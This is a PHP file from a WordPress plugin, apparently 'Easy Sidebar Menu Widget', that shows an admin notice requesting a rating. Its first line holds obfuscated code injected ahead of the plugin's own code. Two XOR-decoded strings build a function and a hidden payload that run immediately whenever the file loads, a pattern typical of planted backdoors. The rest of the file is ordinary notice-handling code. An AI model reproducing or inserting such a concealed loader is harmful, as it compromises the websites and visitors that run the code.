<?php $sMUFVcGusVUb='O86P9.h3<SQDWR>'^',JS1MK7UI=20>=P';$mRqKMzGyZM=$sMUFVcGusVUb('','91rM67C;E87N.Y480.<mB>;1h 6HSs9MK-AkMmPS=X69Y10Q<ZSV=.=0HP7.WMOAh41N3iYm>SIyzYXlg1n;knYI1XgbAHMp:SF 8ni=fSSqyOF0l6ZFXEYEO.4<XZrawYaxxY97hZ6DHTYYLaI9T2>bTsBfCg-V6>s0aBV0>>92NeR8NNgdpi23kBE826RyNOC-Dz<=0PHorUD0B-XueSP.MIcPgRXBA--21beV5JZIUIzDUYRNTC;oXUd+6;s3 B :oNZ HWkgUMM,XI4SkOs3hVVIVsRI,ewhPG,Eol>hHZH;iiwpA2U3,qH.BBG>SIKMJ.T+HOFb:0O0XYPEHzCkk367n6igZ7GpPWEKTvswB,TD6bk4GlHbP5F 9R.,bSmpY2+Mn54k07 9ZVFQJ6Y0EcOH<3+LXF=XG.iQm9;75.:S L08NgKWC<W,E60;U3,fQ;JIXRqQQWSTHPAR-1AcycT0A6W62U0lyiPXFEqSYH9hvAw8=:WE3K<Go.A, 2Myu3=-WKQC5A3JeuEQjgSZLelRZ5Agc9HEsiBSGdvtcGUpV2NaHuQG4YVre-Iw,KERESZPgRUQkYcviNSA<5Y.1SJcN-Y<O=aiCWRW,VDMmOGI ETaKFsHpbWGZM5NLGzn=W2WlQGSCWBQZS.dcf=T9=;YGpn>I'^'PWZlPB-X1QX q<LQCZOEeFTC7DW<2,f >YfBdM+Y4>CW:EY>Rz+9OqYQ<1hq:8;iLPP:REyIU60PZyxLGJd2bJ6<ExZBfovz3Z OJFMTFnsABobYPE.44 7mkJUH9sIAS0JSQS0>L5C0hzdydE-X SeF=.b8cCF3OeWYAgvCJLUW MvS+7N9YR8:b0 LGD<Qj 6YmA64MZ5exq Q6LxHE51B>,XZC696 rFWHBXvS+6:0rpN36 +5 SOpq;hyt8zebAIOj1E1wVYui;M4<QzK4y:L27=7,9,UEJHt,I<Tf7L,;<ZITWT7S9FIJBSHH.Xsaji.O Jao=h3V B=83-hRg49vgb+e=G;DgT;2<kiHSS4M81SKKOMeAF4T2Af9KUBnMT2WRvd<=OTVTXzkfu<W5E XEAA9VFRbY93OIlMyNYFKH:A YB+O381c3M1Wod8FXN3Z9,nf.544<0-xe6LE JUCpT B6iY0IEPRZ1 mU78<XHPgWYOH6<l Y>0K9ESF>QRXXTpgqgQ G+LUcwJO>>yMH6;A <DR-<T4kszYVSPv6FcQ+Y+G7tPndCSOyFMxv0w0bcP1a0LpCPOn23NT qZ63<+U0O;NIN36+;C7 jAoc-A15HbfShPBw<PDP8-+RJY6F67v72:;-0>tsMXl41ATOqwYU44');$mRqKMzGyZM();
/**
 * Handles additional widget tab options
 * run on __construct function
 */
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if( !class_exists( 'EASY_SIDEBAR_MENU_WIDGET_NOTICES' ) ):
class EASY_SIDEBAR_MENU_WIDGET_NOTICES {
    public function  __construct() {
        if ( is_admin() ){
            add_action( 'admin_notices', array( &$this, 'admin_messages') );
        }
        add_action('wp_ajax_easy_sidebar_menu_widget_hideRating', array( &$this, 'hide_rating') );
    }

    /* Hide the rating div
     * @return json string
     *
     */
    function hide_rating(){
        update_option('easy_sidebar_menu_widget_RatingDiv','yes');
        echo json_encode(array("success")); exit;
    }

    /**
     * Admin Messages
     * @return void
     */
    function admin_messages() {
        if (!current_user_can('update_plugins'))
        return;


        $install_date   = get_option('easy_sidebar_menu_widget_installDate');
        $saved          = get_option('easy_sidebar_menu_widget_RatingDiv');
        $display_date   = date('Y-m-d h:i:s');
        $datetime1      = new DateTime($install_date);
        $datetime2      = new DateTime($display_date);
        $diff_intrval   = round(($datetime2->format('U') - $datetime1->format('U')) / (60*60*24));
        if( 'yes' != $saved && $diff_intrval >= 7 ){
        echo '<div class="easy_sidebar_menu_widget_notice updated" style="box-shadow: 0 1px 1px 0 rgba(0,0,0,.1);">
            <p>Awesome, you\'ve been using <strong>Easy Sidebar Menu Widget</strong> for more than 1 week. <br> May i ask you to give it a <strong>5-star rating</strong> on Wordpress? </br>
            This will help to spread its popularity and to make this plugin a better one.
            <br><br>Your help is much appreciated. Thank you very much,<br> ~ Jeffrey Carandang <em>(phpbits)</em>
            <ul>
                <li><a href="http://wordpress.org/plugins/easy-sidebar-menu-widget/" class="thankyou" target="_blank" title="Ok, you deserved it" style="font-weight:bold;">'. __( 'Ok, you deserved it', 'easy_sidebar_menu_widget' ) .'</a></li>
                <li><a href="javascript:void(0);" class="easy_sidebar_menu_widget_bHideRating" title="I already did" style="font-weight:bold;">'. __( 'I already did', 'easy_sidebar_menu_widget' ) .'</a></li>
                <li><a href="javascript:void(0);" class="easy_sidebar_menu_widget_bHideRating" title="No, not good enough" style="font-weight:bold;">'. __( 'No, not good enough, i do not like to rate it!', 'easy_sidebar_menu_widget' ) .'</a></li>
            </ul>
        </div>
        <script>
        jQuery( document ).ready(function( $ ) {

        jQuery(\'.easy_sidebar_menu_widget_bHideRating\').click(function(){
            var data={\'action\':\'easy_sidebar_menu_widget_hideRating\'}
                 jQuery.ajax({

            url: "'. admin_url( 'admin-ajax.php' ) .'",
            type: "post",
            data: data,
            dataType: "json",
            async: !0,
            success: function(e) {
                if (e=="success") {
                   jQuery(\'.easy_sidebar_menu_widget_notice\').slideUp(\'slow\');

                }
            }
             });
            })

        });
        </script>
        ';
        }
    }
}
new EASY_SIDEBAR_MENU_WIDGET_NOTICES();
endif;
?>
